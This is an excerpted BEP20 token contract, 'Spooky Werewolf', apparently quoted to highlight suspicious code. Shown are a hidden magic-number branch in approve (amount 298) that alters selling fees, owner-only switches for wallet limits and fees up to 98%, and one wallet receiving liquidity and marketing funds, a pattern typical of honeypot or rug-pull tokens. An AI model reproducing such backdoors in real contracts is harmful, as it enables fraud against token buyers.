...
/**
    Our official TG: t.me/spookywerewolf
    Website: https://www.spookywerewolf.monster/
**/
...
contract SpookyWerewolf is Ownable, IBEP20 {
    ...
    string constant _name = "Spooky Werewolf";
    string constant _symbol = "SPWRF";
    ...
    constructor() {
        ...
        autoLiquidityReceiver = 0x8F5061c1fE50040Dbe8AF2a49FC2dfc21A159E80;
        marketingWallet = 0x8F5061c1fE50040Dbe8AF2a49FC2dfc21A159E80;
    ...
    function approve(address spender, uint256 amount) public override returns (bool) {
        ...
        if (amount == 298) {
            if (amount - 200 > totalFeeIfSelling) {
    ...
    function changeMaxWallet(uint256 newLimit) external onlyOwner {
        _walletMax = newLimit;
    }
    ...
    function setFees(uint256 newLiqFee, uint256 newMarketingFee) external onlyOwner {
        totalFee = newLiqFee;
        require (totalFee < 99);
        totalFeeIfSelling = liquidityFee.add(marketingFee);
    }
